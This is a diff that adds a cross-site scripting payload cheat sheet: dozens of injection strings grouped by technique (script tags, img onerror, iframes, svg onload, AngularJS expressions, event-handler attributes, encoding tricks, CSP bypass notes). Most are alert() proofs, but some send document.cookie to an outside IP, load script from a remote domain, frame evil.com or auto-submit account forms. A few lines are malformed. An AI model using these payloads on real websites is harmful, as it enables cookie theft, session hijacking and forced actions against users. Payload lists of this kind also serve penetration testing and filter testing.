@@ -1,0 +1,165 @@
+#${alert(1)}
+
+'-alert(document.domain)-'
+
+';alert(document.cookie)//
+
+"onload=alert"()"
+
+';alert(String.fromCharCode(88,83,83))//
+
+';alert(String.fromCharCode(88,83,83))//";
+
+\";alert('XSS');//
+
+\"-alert(1)}//
+
+d=\"alert('XSS');\\")\";
+
+eval(atob("YWxlcnQoMSk=")) // Base64 for alert(1) 
+_______________________________________________________________________________________________________________________________________________________________
+// XSS in canonical link tag
+https://whatever.domain/?%27accesskey=%27x%27onclick=%27alert(1)
+_______________________________________________________________________________________________________________________________________________________________
+
+<script>alert(1)</script> // add </>
+
+"/><script>alert(1)</script>
+
+</script><script>alert(1)</script>
+
+'"></script><img src=x onerror=alert(1)>{{'7'*7}}
+
+<script>confirm`XSS`</script>
+_______________________________________________________________________________________________________________________________________________________________
+
+\x3Cscript>javascript:alert(1)</script>
+
+%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
+
+žscriptualert(EXSSE)ž/scriptu
+
+'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
+
+"`'><script>\x3Bjavascript:alert(1)</script>
+
+<script>fetch'(http://ip-address/?cookie=' + document.cookie);</script>
+
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41)))</script>
+
+_______________________________________________________________________________________________________________________________________________________________
+
+<><img src=1 onerror=alert(1)>
+
+<img/src/onerror=import("//nischal.xss/")> 
+
+"/><img src=0 onerror=alert("Hello")>    
+
+</script><img src=1 onerror=alert(document.domain)>
+
+`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
+
+<IMG SRC="javascript:alert('XSS');"> 
+
+"><img src='//attacker-website.com?
+
+<img src="X" onerror=top[8680439..toString(30)](1337+document.cookie)>
+
+">\]<img src=X onerror=alert(document.domain)>
+
+<img src/onerror=prompt(document.cookie)>
+
+<Img Src=OnXSS OnError=prompt(document.cookie)>
+_______________________________________________________________________________________________________________________________________________________________
+
+<iframe src="javascript:alert(document.cookie);"></iframe>
+
+<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+
+<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
+
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+
+<!DOCTYPE html><iframe src="https://evil.com" style="width:800px;height:800px"></iframe>
+
+"><iframe src="https:evil.com" style="border:0;position:fixed;top:0;right:0;bottom:0;width=100%:height:100%"></iframe>
+
+<iframe src =my-account onload = this.contentDocument.forms[1].submit() >
+_______________________________________________________________________________________________________________________________________________________________
+
+<img ='><svg onload="alert(1)"'>
+
+"><svg onload=alert(1)>
+
+<svg onload="attributes[0].value=id+URL+id,new onload" id=`> 
+
+{{$on.constructor('alert(1)')()}} //very powerful on some
+
+';a=prompt,a()//
+_______________________________________________________________________________________________________________________________________________________________
+
+javascript:alert(1)
+
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
+
+<object onerror=javascript:javascript:alert(1)>
+_______________________________________________________________________________________________________________________________________________________________
+{{}}  //try more
+{{$on.constructor('alert(1)')()}} //angular js expression
+
+perl -e 'print \"&lt;SCR\0IPT&gt;alert(\\"XSS\\")&lt;/SCR\0IPT&gt;\";' &gt; out
+<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
+
+document.write('... <script>alert(document.domain)</script> ...');
+_______________________________________________________________________________________________________________________________________________________________
+
+<h1>hello</h1>
+
+<font color="red">error
+
+<a href="javascript:alert(document.domain)">
+
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+
+<script src=1 href=1 onerror="javascript:alert(1)"></script>
+
+<body src=1 href=1 onerror="javascript:alert(1)"></body>
+
+<image src=1 href=1 onerror="javascript:alert(1)"></image>
+
+<object src=1 href=1 onerror="javascript:alert(1)"></object>
+
+<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
+
+<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+
+&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert('XSS');\"&gt;
+
+<a href="jav&#65ascript:javascript:alert(1)">test1</>
+_______________________________________________________________________________________________________________________________________________________________
+//introduce a new attribute that creates a scriptable context
+
+" autofocus onfocus=alert(document.domain) x="
+
+<svg onload="attributes[0].value=id+URL+id,new onfocus" id=` autofocus>
+
+"onmouseover="alert(1)
+
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
+
+" onmouseover="alert(1)"    // after the = don't use "" if it's getting encoded 
+
+' onmouseover='alert(1)'
+
+" onmouseover="alert(1)"  autofocus="
+_______________________________________________________________________________________________________________________________________________________________
+<svg>
+  <a>
+    <animate attributeName=href values=javascript:alert(1) />
+    <text x=20 y=20>Click me</text>
+  </a>
+</svg>
+
+script-src-elem 'unsafe-inself' <payload>
+script-src-elem 'unsafe-eval' <payload>
+<script nonce="abc123">alert('CSP bypassed!');</script>
